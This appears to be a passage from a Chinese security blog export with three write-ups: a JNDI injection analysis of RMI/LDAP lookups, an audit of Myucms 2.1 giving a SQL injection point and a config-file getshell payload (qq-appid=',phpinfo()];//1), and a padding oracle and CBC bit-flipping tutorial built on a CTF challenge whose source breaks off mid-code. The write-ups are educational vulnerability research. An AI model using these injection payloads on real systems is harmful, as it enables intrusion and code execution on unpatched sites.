<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">if</span> (ref != <span class="keyword">null</span>) &#123;</span><br><span class="line">        String f = ref.getFactoryClassName();</span><br><span class="line">        <span class="keyword">if</span> (f != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// if reference identifies a factory, use exclusively</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//跟进            factory = getObjectFactoryFromReference(ref, f);</span></span><br><span class="line">            <span class="keyword">if</span> (factory != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> factory.getObjectInstance(ref, name, nameCtx,</span><br><span class="line">                                                 environment);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>通过getObjectFactoryFromReference或者getObjectInstance进行命令执行,这两个命令执行点都可以进行命令执行，不过第一个在执行的时候会发生报错，由于我们自定义的类实例化后不能转化为ObjectFactory，所以我们需要定义的类要继承该类，并且重写getObjectInstance接口，完成第二处命令执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">         clas = helper.loadClass(factoryName);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        <span class="comment">// ignore and continue</span></span><br><span class="line">        <span class="comment">// e.printStackTrace();</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// All other exceptions are passed up.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Not in class path; try to use codebase</span></span><br><span class="line">    String codebase;</span><br><span class="line">    <span class="keyword">if</span> (clas == <span class="keyword">null</span> &amp;&amp;</span><br><span class="line">            (codebase = ref.getFactoryClassLocation()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            clas = helper.loadClass(factoryName, codebase);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (clas != <span class="keyword">null</span>) ? (ObjectFactory) clas.newInstance() : <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先尝试本地或者此class，在本地不存在此class的情况下，从codebase中获取此class并且进行加载和实例化</p>
<h4 id="RMI-JNDI注入原理"><a href="#RMI-JNDI注入原理" class="headerlink" title="RMI+JNDI注入原理"></a>RMI+JNDI注入原理</h4><p>当注册RMI服务的时候，可以指定远程加载类codebase url的位置，通过该属性可以让JNDI来加载我们指定的远程类，当<code>JNDI</code>应用程序通过<code>lookup</code>(RMI服务的地址)调用指定<code>codebase url</code>上的类后，会调用被远程调用类的构造方法，所以如果我们将恶意代码放在被远程调用类的构造方法中时，漏洞就会触发。</p>
<h4 id="RMI触发JNDI的限制"><a href="#RMI触发JNDI的限制" class="headerlink" title="RMI触发JNDI的限制"></a>RMI触发JNDI的限制</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">            ctx.lookup(<span class="string">"rmi://localhost:8080/refObj"</span>);</span><br><span class="line">            String data = <span class="string">"This is RMI Client."</span>;</span><br><span class="line">            <span class="comment">//System.out.println(serv.service(data));</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过上面这段代码，我们会发现我们是需要一个可控的参数的，并且在java高版本中和低版本的某些版本中<strong>系统属性 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为false</strong>，即默认不允许从远程的Codebase加载Reference工厂类。</p>
<h3 id="LDAP-JNDI注入"><a href="#LDAP-JNDI注入" class="headerlink" title="LDAP+JNDI注入"></a>LDAP+JNDI注入</h3><p>除了RMI实现JNDI注入外，同样LDAP也可以实现JNDI注入，同RMI来对比，<code>LDAP</code>服务的<code>Reference</code>远程加载Factory类不受上一点中 <code>com.sun.jndi.rmi.object.trustURLCodebase</code>、<code>com.sun.jndi.cosnaming.object.trustURLCodebase</code>等属性的限制，不过在之后的版本，也对这些属性进行了限制，如 对com.sun.jndi.ldap.object.trustURLCodebase 属性的默认值被调整为false.</p>
<p>JNDIClient</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LDAPClient</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    String uri = <span class="string">"ldap://127.0.0.1:8088/aa"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//        String uri = "rmi://127.0.0.1:1099/aa";</span></span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        ctx.lookup(uri);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2020/02/27/30g2BF.png" alt="30g2BF.png"></p>
<p>调用过程和RMI触发JNDI差不多，就不详细分析了。</p>
<h4 id="LDAP触发JNDI注入的限制"><a href="#LDAP触发JNDI注入的限制" class="headerlink" title="LDAP触发JNDI注入的限制"></a>LDAP触发JNDI注入的限制</h4><p>其实和RMI的差不多，就不再赘述了。</p>
<h3 id="关于JNDI注入的一个问题"><a href="#关于JNDI注入的一个问题" class="headerlink" title="关于JNDI注入的一个问题"></a>关于JNDI注入的一个问题</h3><p>这个问题是看Seebug发现的，不过在调试RMI 触发的这个过程正好可以解决这个问题，文章的作者也给了很详细的说明</p>
<blockquote>
<p>Q:oC 里面向 rmi registry 绑定 ReferenceWrapper 的时候，真正绑定进去的应该是它的 Stub 才对，Stub 的对象是怎么造成客户端的代码执行的。</p>
</blockquote>
<p>对于这段代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">lookup</span><span class="params">(Name var1)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (var1.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> RegistryContext(<span class="keyword">this</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Remote var2;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var2 = <span class="keyword">this</span>.registry.lookup(var1.get(<span class="number">0</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NotBoundException var4) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NameNotFoundException(var1.get(<span class="number">0</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (NamingException)wrapRemoteException(var5).fillInStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.decodeObject(var2, var1.getPrefix(<span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码的主要作用是从registry中拿出远程对象赋给var2,并且这个var2为stud类型</p>
<p>关键在于下一段的代码处理</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Object <span class="title">decodeObject</span><span class="params">(Remote var1, Name var2)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Object var3 = var1 <span class="keyword">instanceof</span> RemoteReference ?</span><br><span class="line">                ((RemoteReference)var1).getReference() : var1;</span><br><span class="line">        <span class="keyword">return</span> NamingManager.getObjectInstance(var3, var2, </span><br><span class="line">                <span class="keyword">this</span>, <span class="keyword">this</span>.environment);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NamingException var5) &#123;</span><br><span class="line">        <span class="keyword">throw</span> var5;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException var6) &#123;</span><br><span class="line">        <span class="keyword">throw</span> (NamingException)wrapRemoteException(var6).fillInStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">        NamingException var4 = <span class="keyword">new</span> NamingException();</span><br><span class="line">        var4.setRootCause(var7);</span><br><span class="line">        <span class="keyword">throw</span> var4;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>decodeObject</code> 函数将 stub 还原成了 Reference，所以才可以造成代码执行。</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://paper.seebug.org/417/" target="_blank" rel="noopener">https://paper.seebug.org/417/</a></p>
<p><a href="https://www.smi1e.top/java代码审计学习之jndi注入/" target="_blank" rel="noopener">https://www.smi1e.top/java%e4%bb%a3%e7%a0%81%e5%ae%a1%e8%ae%a1%e5%ad%a6%e4%b9%a0%e4%b9%8bjndi%e6%b3%a8%e5%85%a5/</a></p>
<p><a href="https://xz.aliyun.com/t/6633#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/6633#toc-5</a></p>
<p><a href="https://www.cnblogs.com/tr1ple/p/11558842.html" target="_blank" rel="noopener">https://www.cnblogs.com/tr1ple/p/11558842.html</a></p>
]]></content>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>Myucms 2.1 SQL注入加后台getshell</title>
    <url>/2020/02/29/Myucms-2-1-SQL%E6%B3%A8%E5%85%A5%E5%8A%A0%E5%90%8E%E5%8F%B0getshell/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>找了一个cms审了一下，有趣的是，这个cms的后台getshell挺明显的，本来想着能交个洞，搜了一下这个cms相关的洞…被交过了..而且还发了分析（就在前几天….</p>
<h3 id="前台SQL注入"><a href="#前台SQL注入" class="headerlink" title="前台SQL注入"></a>前台SQL注入</h3><p>这个sql注入挺明显的</p>
<p>位置挺多，随便拉一处来分析一下</p>
<p>/bbs/Comment/ding</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ding</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!session(<span class="string">'userid'</span>) || !session(<span class="string">'username'</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> json(<span class="keyword">array</span>(<span class="string">'code'</span> =&gt; <span class="number">0</span>, <span class="string">'msg'</span> =&gt; <span class="string">'请登录'</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (session(<span class="string">'userid'</span>)!=<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;error(<span class="string">'谁给你的权限？'</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $id = input(<span class="string">'id'</span>);</span><br><span class="line">        $data[<span class="string">'settop'</span>] = <span class="number">1</span>;</span><br><span class="line">       $datas[<span class="string">'settop'</span>] = <span class="number">0</span>;</span><br><span class="line">        $da = Db::name(<span class="string">'forum'</span>)-&gt;where(<span class="string">'id'</span>,$id)-&gt;value(<span class="string">'settop'</span>);</span><br><span class="line">      <span class="keyword">if</span> ($da == <span class="number">0</span>) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (Db::name(<span class="string">'forum'</span>)-&gt;where(<span class="string">"id = &#123;$id&#125;"</span>)-&gt;update($data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> json(<span class="keyword">array</span>(<span class="string">'code'</span> =&gt; <span class="number">200</span>, <span class="string">'msg'</span> =&gt; <span class="string">'置顶成功'</span>));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> json(<span class="keyword">array</span>(<span class="string">'code'</span> =&gt; <span class="number">0</span>, <span class="string">'msg'</span> =&gt; <span class="string">'置顶失败'</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (Db::name(<span class="string">'forum'</span>)-&gt;where(<span class="string">"id = &#123;$id&#125;"</span>)-&gt;update($datas)) &#123;</span><br><span class="line">            <span class="keyword">return</span> json(<span class="keyword">array</span>(<span class="string">'code'</span> =&gt; <span class="number">200</span>, <span class="string">'msg'</span> =&gt; <span class="string">'取消置顶成功'</span>));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> json(<span class="keyword">array</span>(<span class="string">'code'</span> =&gt; <span class="number">0</span>, <span class="string">'msg'</span> =&gt; <span class="string">'取消置顶失败'</span>));</span><br><span class="line">        &#125;</span><br><span class="line">       &#125; </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>漏洞点单拉出来：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">if</span> ($da == <span class="number">0</span>) &#123; </span><br><span class="line"><span class="keyword">if</span> (Db::name(<span class="string">'forum'</span>)-&gt;where(<span class="string">"id = &#123;$id&#125;"</span>)-&gt;update($data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> json(<span class="keyword">array</span>(<span class="string">'code'</span> =&gt; <span class="number">200</span>, <span class="string">'msg'</span> =&gt; <span class="string">'置顶成功'</span>));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> json(<span class="keyword">array</span>(<span class="string">'code'</span> =&gt; <span class="number">0</span>, <span class="string">'msg'</span> =&gt; <span class="string">'置顶失败'</span>));</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>id={$id}明显存在注入，打个断点，看一下具体执行的是什么语句，去闭合一下</p>
<p>发现他的闭合形式为 where (id=1),闭合后进行注入即可</p>
<p><img src="https://s2.ax1x.com/2020/02/29/3yAhJP.png" alt="3yAhJP.png"></p>
<h3 id="后台getshell"><a href="#后台getshell" class="headerlink" title="后台getshell"></a>后台getshell</h3><p>这个getshell挺明显的</p>
<p>admin/controller/Config/addqq</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addqq</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   $path = <span class="string">'application/extra/qq.php'</span>;</span><br><span class="line">   $file = <span class="keyword">include</span> $path;      </span><br><span class="line">   $config = <span class="keyword">array</span>(</span><br><span class="line">     <span class="string">'qq-appid'</span> =&gt; input(<span class="string">'qq-appid'</span>),</span><br><span class="line">     <span class="string">'qq-appkey'</span> =&gt; input(<span class="string">'qq-appkey'</span>),</span><br><span class="line">     <span class="string">'qq-callback'</span> =&gt; input(<span class="string">'qq-callback'</span>),</span><br><span class="line">   );</span><br><span class="line">    $res = array_merge($file, $config);</span><br><span class="line">    $str = <span class="string">'&lt;?php return ['</span>;</span><br><span class="line">    <span class="keyword">foreach</span> ($res <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">        $str .= <span class="string">'\''</span> . $key . <span class="string">'\''</span> . <span class="string">'=&gt;'</span> . <span class="string">'\''</span> . $value . <span class="string">'\''</span> . <span class="string">','</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $str .= <span class="string">']; '</span>;</span><br><span class="line">    <span class="keyword">if</span> (file_put_contents($path, $str)) &#123;</span><br><span class="line">        <span class="keyword">return</span> json(<span class="keyword">array</span>(<span class="string">'code'</span> =&gt; <span class="number">200</span>, <span class="string">'msg'</span> =&gt; <span class="string">'修改成功'</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> json(<span class="keyword">array</span>(<span class="string">'code'</span> =&gt; <span class="number">0</span>, <span class="string">'msg'</span> =&gt; <span class="string">'修改失败'</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>post传下参数进行闭合：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">qq-appid&#x3D;&#39;,phpinfo()];&#x2F;&#x2F;1</span><br></pre></td></tr></table></figure>

<p>访问下主页：<br><a href="https://imgchr.com/i/3yVzb4" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/02/29/3yVzb4.png" alt="3yVzb4.png"></a></p>
<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>看完了五本灵异类小说….终于对这种小说的故事线开始产生厌倦了…</p>
]]></content>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Padding oracle attack与CBC字节翻转攻击的邂逅</title>
    <url>/2019/06/01/Padding-oracle-attack%E4%B8%8ECBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB%E7%9A%84%E9%82%82%E9%80%85/</url>
    <content><![CDATA[<h3 id="CBC加密模式"><a href="#CBC加密模式" class="headerlink" title="CBC加密模式"></a>CBC加密模式</h3><p>加密过程：</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g34dkdbijfj30go06r3yz.jpg" alt=""></p>
<p>由图可以看出加密过程为：将明文以16字节或者8字节进行分组，对应着也就是AES和DES，不足位数的进行填充，分组填充完毕后，<strong>第一组明文与初始向量IV异或</strong>，并进行<strong>加密生成第一组密文</strong>，<strong>第一组密文和第二组明文进行异或操作，再次进行加密生成第二组密文</strong>，以此类推，将生成的所有密文进行整合，就是所生成的密文。</p>
<p>解密过程：</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g34ecuqifvj30go066mxm.jpg" alt=""></p>
<p>过程与加密类似</p>
<p>也是将密文以16字节或8字节进行分组，<strong>第一组密文先进行解密得到中间量与初始向量进行异或得到第一组明文，然后将第二组密文进行解密后与第一组密文进行异或得到第二组明文</strong>，以此类推，获得所有明文。</p>
<h3 id="Padding-Oracle-Attack攻击"><a href="#Padding-Oracle-Attack攻击" class="headerlink" title="Padding Oracle Attack攻击"></a>Padding Oracle Attack攻击</h3><p>Padding Oracle Attack的攻击主要位于解密过程</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g34ereldy0j30rk08djte.jpg" alt=""></p>
<p>密文经过解密过程所生成的值为明文与前一个IV向量所异或生成的值，<strong>称为中间值</strong>。</p>
<h4 id="Padding填充规则"><a href="#Padding填充规则" class="headerlink" title="Padding填充规则"></a><strong>Padding填充规则</strong></h4><p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g34ewywkcjj30ly0c5jro.jpg" alt=""></p>
<p><strong>对于DES</strong>，不足八位则需要填充至八位，填充的每位为缺少位数的十六进制，例如FIG，则每位需要填充的是0x05(如图所示)。</p>
<p><strong>对于AES</strong>，不足十六位的需要填充至十六位，填充的每位为缺少位数的十六进制，如<strong>lihuaiqiu</strong>，则填充为<strong>lihuaiqiu\x07\x07\x07\x07\x07\x07\x07</strong></p>
<h4 id="Padding-oracle-attack攻击原理"><a href="#Padding-oracle-attack攻击原理" class="headerlink" title="Padding oracle attack攻击原理"></a>Padding oracle attack攻击原理</h4><p>Paddding oracle attack为<strong>针对CBC链接模式的攻击</strong>，和DES，AES等加密算法没有关系。</p>
<p><strong>使用CBC模式加密敏感信息的服务器对提交信息的处理方法</strong>：</p>
<p>我们所传递的信息经过CBC加密模式传递给服务器，服务器尝试去解密。</p>
<p>当我们输入一个错误的向量IV，依然可以进行解密，但是最终生成的填充值却是错误的.如本应填充完毕的值为</p>
<p><strong>TEST\x04\x04\x04\x04</strong></p>
<p>通过错误向量IV得到的值为<strong>TEST\x04\x04\x04\x2c</strong>，<strong>而事实上服务器就是通过判断最后一组的填充值来判断是否可以正常解密的</strong>，如果无法进行正常解密，则会<strong>抛出<code>Padding Error</code>,对应着也就会返回302或者500报错，而可以正常解密的情况下返回值是200</strong>。</p>
<p>也就是说可以分为如下几种情况：</p>
<ul>
<li>无法正常解密(返回500或者302)</li>
<li>可以正常解密，密码正确(200)</li>
<li>可以正常解密，密码错误(200)</li>
</ul>
<h4 id="攻击利用"><a href="#攻击利用" class="headerlink" title="攻击利用"></a>攻击利用</h4><p>我们可以知道，明文的是由middle值和上一组的密文也就是IV向量值异或生成的，如下图：</p>
<p><img src="https://image.3001.net/uploads/image/20131028/20131028140730_78503.png" alt="img"></p>
<p>而此时我们只知道的是向量IV的值，<strong>但是我们可以通过输入的向量的IV值和服务器的返回状态来判断middle的值，进一步接触明文的值</strong>。</p>
<h4 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h4><ul>
<li>先假定明文只填充了一个字节，而后对倒数第二组的密文从<code>0x00</code>-&gt;<code>0xff</code>进行遍历，直到返回的正确状态码200，<strong>代表可以正常解密</strong>。</li>
</ul>
<p>通过公式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Middle[8]^初始IV[8]&#x3D;plain[8]</span><br><span class="line"></span><br><span class="line">Middle[8]^构造IV[8]&#x3D;0x01</span><br></pre></td></tr></table></figure>

<p>可得<strong>plain[8]=0x01^构造IV[8]^初始IV[8]</strong>。</p>
<p><img src="https://image.3001.net/uploads/image/20131028/20131028140812_51657.png" alt="img"></p>
<ul>
<li>再假定明文填充了两个字节，此时需要有一个关键性步骤，<strong>更新构造向量IV的最后一个字节的值</strong>，因为现在我们的是两个0x02，先更新向量IV的最后一个字节的值，因为我们已经知道了原来Middle的最后一个字节的值，所以可以很快的构造出向量IV的最后一个字节的值，公式为<strong>IV[8]=middle[8]^0x02</strong>,</li>
</ul>
<p>然后接着爆破遍历IV[7]的值。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Middle[7]^初始IV[7]&#x3D;plain[7]</span><br><span class="line"></span><br><span class="line">Middle[7]^构造IV[7]&#x3D;0x02</span><br></pre></td></tr></table></figure>

<p><img src="http://img.zhaojie.me/blog/padding-oracle-attack-in-detail/po_fig9.png" alt="img"></p>
<p>通过同样的方式得到<strong>plain[7]</strong>的值</p>
<ul>
<li>循环此方式，并且<strong>注意向量IV的更新</strong>，最终得到最后一组的明文。</li>
</ul>
<p><img src="http://img.zhaojie.me/blog/padding-oracle-attack-in-detail/po_fig10.png" alt="img"></p>
<ul>
<li><strong>舍弃掉最后一组的密文，只提交第一组到倒数第二组的密文</strong>，通过构造倒数第三组的密文(向量IV)得到倒数第二组的明文,循环此过程，得到全部的明文。</li>
</ul>
<h4 id="攻击成立条件"><a href="#攻击成立条件" class="headerlink" title="攻击成立条件"></a>攻击成立条件</h4><ul>
<li>攻击者能够获得密文，以及附带在密文前面的IV。</li>
<li>攻击者能够触发密文的解密过程。</li>
</ul>
<h3 id="CBC字节翻转攻击"><a href="#CBC字节翻转攻击" class="headerlink" title="CBC字节翻转攻击"></a>CBC字节翻转攻击</h3><p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g34ecuqifvj30go066mxm.jpg" alt=""></p>
<h4 id="CBC攻击核心思路"><a href="#CBC攻击核心思路" class="headerlink" title="CBC攻击核心思路"></a>CBC攻击核心思路</h4><p>攻击过程仍然为解密过程，不过这里的<strong>核心思路是已知明文，并且利用向量IV去改变解密后的明文，如知道解密后的明文为ktctf，我们想来构造一个IV，使其解密后变成admin(这里最好字母位数要对应)。</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">公式：</span><br><span class="line"></span><br><span class="line">初始IV[1]^middle[1]&#x3D;plain[1]</span><br><span class="line"></span><br><span class="line">构造:</span><br><span class="line"></span><br><span class="line">构造IV[1]^middle[1]&#x3D;a</span><br><span class="line"></span><br><span class="line">所以</span><br><span class="line"></span><br><span class="line">构造IV[1]&#x3D;middle[1]^a</span><br><span class="line"></span><br><span class="line">middle[1]&#x3D;plain[1]^初始IV[1]</span><br><span class="line"></span><br><span class="line">最终可得</span><br><span class="line"></span><br><span class="line">构造IV[1]&#x3D;plain[1]^初始IV[1]^a</span><br></pre></td></tr></table></figure>

<p>通过修改IV即可任意达到我们想要修改解密后的数据</p>
<h4 id="Padding-oracle-attack与CBC字节翻转攻击的邂逅"><a href="#Padding-oracle-attack与CBC字节翻转攻击的邂逅" class="headerlink" title="Padding oracle attack与CBC字节翻转攻击的邂逅"></a>Padding oracle attack与CBC字节翻转攻击的邂逅</h4><p>在大体思路上，我们想要更改解密后字符串，是一定要知道具体的明文的，如果是给出部分明文还好，但是在没有明文的情况下，只有密文与初始向量IV该怎么攻击</p>
<p><strong>解决方法</strong>:<strong>利用上述介绍的Padding oracle attack方法换原出所有明文，进而通过明文来修改得到我们想要的数据。</strong></p>
<h4 id="CBC字节翻转攻击实战"><a href="#CBC字节翻转攻击实战" class="headerlink" title="CBC字节翻转攻击实战"></a>CBC字节翻转攻击实战</h4><p>看到比较典型的就是ISCC2018的一道题了，在CBC字节翻转攻击中应该是算很基础的那种了。</p>
<p>源码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'sqlwaf.php'</span>;</span><br><span class="line">define(<span class="string">"SECRET_KEY"</span>, <span class="string">"................"</span>);</span><br><span class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_random_iv</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $iv=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">16</span>;$i++)&#123;</span><br><span class="line">        $iv.=chr(rand(<span class="number">1</span>,<span class="number">255</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $iv;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 使用aes-128-cbc 模式加密</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($info)</span></span>&#123;</span><br><span class="line">    $iv=get_random_iv();</span><br><span class="line">    $plain = serialize($info);</span><br><span class="line">    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</span><br><span class="line">    $_SESSION[<span class="string">'username'</span>] = $info[<span class="string">'username'</span>];</span><br><span class="line">    setcookie(<span class="string">"iv"</span>, base64_encode($iv));<span class="comment">// cookie[iv] = 随机生成的iv 的base64</span></span><br><span class="line">    setcookie(<span class="string">"cipher"</span>, base64_encode($cipher));<span class="comment">// cookie[cipher] = 加密值的base64</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_homepage</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($_SESSION[<span class="string">"username"</span>]===<span class="string">'admin'</span>)&#123;<span class="comment">//发现当账号为admin，才会显示flag，</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Hello admin&lt;/p&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Flag is *************&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;hello '</span>.$_SESSION[<span class="string">'username'</span>].<span class="string">'&lt;/p&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Only admin can see flag&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;p&gt;&lt;a href="loginout.php"&gt;Log out&lt;/a&gt;&lt;/p&gt;'</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 解密cipher</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_login</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'cipher'</span>]) &amp;&amp; <span class="keyword">isset</span>($_COOKIE[<span class="string">'iv'</span>]))&#123;</span><br><span class="line">        $cipher = base64_decode($_COOKIE[<span class="string">'cipher'</span>]);</span><br><span class="line">        $iv = base64_decode($_COOKIE[<span class="string">"iv"</span>]);<span class="comment">//cipher和iv变量均中cookie数组中取</span></span><br><span class="line">        <span class="keyword">if</span>($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;</span><br><span class="line">            $info = 